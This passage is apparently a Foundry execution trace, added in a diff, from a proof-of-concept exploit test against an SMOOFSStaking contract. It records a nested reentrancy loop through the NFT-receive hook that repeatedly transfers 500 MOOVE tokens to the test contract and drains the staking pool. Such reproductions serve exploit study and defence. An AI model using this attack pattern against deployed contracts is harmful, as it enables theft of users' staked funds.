+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2855 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 2854 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xd5ab825b6dd1b7897ca70576be357c4e8183b919d787ed3f8b5032cc1dc086d5: 0x000000000000000000000000000000000000000000008f8df5381f31e8dea28d → 0x000000000000000000000000000000000000000000008f72da53484ef98ea28d
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c: 0x000000000000000000000000000000000000000000000b0dc486088bfea00000 → 0x000000000000000000000000000000000000000000000b28df6adf6eedf00000
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x5f6eee5777689fac8d5a6d5f66349ac0b0aaf490b4d918486710d1c6412d3a72: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x86935f44ff27c626cca4651a451c8e1efe7133f7038398be5387e4f3c2a97546: 0x00000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149602 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 12: 1091 → 1090
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x86935f44ff27c626cca4651a451c8e1efe7133f7038398be5387e4f3c2a97547: 0x0000000000000000000000000000000000000000000000000000000065df1afe → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x6e1540171b6c0c960b71a7020d9f60077f6af931a8bbf590da0223dacf75c8c0: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x4c882eda9426d58c8d2738e21e10e7ea3aaef11461d38d11972284555c393f2f: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 9: 274 → 273
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xf3f7a9fe364faab93b216da50a3214154f22a0a2b415b23a84c8169e8b637a09: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 8: 2855 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x86935f44ff27c626cca4651a451c8e1efe7133f7038398be5387e4f3c2a97548: 0x0000000000000000000000000000000000000000000000000000000065df1afe → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x86935f44ff27c626cca4651a451c8e1efe7133f7038398be5387e4f3c2a97549: 0x000000000000000000000000000000000000000000000000000000000338d703 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 32: 8 → 9
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2855 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 2854 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c: 0x000000000000000000000000000000000000000000000b28df6adf6eedf00000 → 0x000000000000000000000000000000000000000000000b43fa4fb651dd400000
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xd5ab825b6dd1b7897ca70576be357c4e8183b919d787ed3f8b5032cc1dc086d5: 0x000000000000000000000000000000000000000000008f72da53484ef98ea28d → 0x000000000000000000000000000000000000000000008f57bf6e716c0a3ea28d
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 12: 1090 → 1089
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 32: 7 → 8
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 2854 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2855 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xd5ab825b6dd1b7897ca70576be357c4e8183b919d787ed3f8b5032cc1dc086d5: 0x000000000000000000000000000000000000000000008f57bf6e716c0a3ea28d → 0x000000000000000000000000000000000000000000008f3ca4899a891aeea28d
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c: 0x000000000000000000000000000000000000000000000b43fa4fb651dd400000 → 0x000000000000000000000000000000000000000000000b5f15348d34cc900000
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 12: 1089 → 1088
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 32: 6 → 7
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 2854 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2855 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xd5ab825b6dd1b7897ca70576be357c4e8183b919d787ed3f8b5032cc1dc086d5: 0x000000000000000000000000000000000000000000008f3ca4899a891aeea28d → 0x000000000000000000000000000000000000000000008f2189a4c3a62b9ea28d
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c: 0x000000000000000000000000000000000000000000000b5f15348d34cc900000 → 0x000000000000000000000000000000000000000000000b7a30196417bbe00000
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 12: 1088 → 1087
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 32: 5 → 6
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2855 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 2854 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c: 0x000000000000000000000000000000000000000000000b7a30196417bbe00000 → 0x000000000000000000000000000000000000000000000b954afe3afaab300000
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xd5ab825b6dd1b7897ca70576be357c4e8183b919d787ed3f8b5032cc1dc086d5: 0x000000000000000000000000000000000000000000008f2189a4c3a62b9ea28d → 0x000000000000000000000000000000000000000000008f066ebfecc33c4ea28d
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 12: 1087 → 1086
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 32: 4 → 5
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 2854 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2855 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
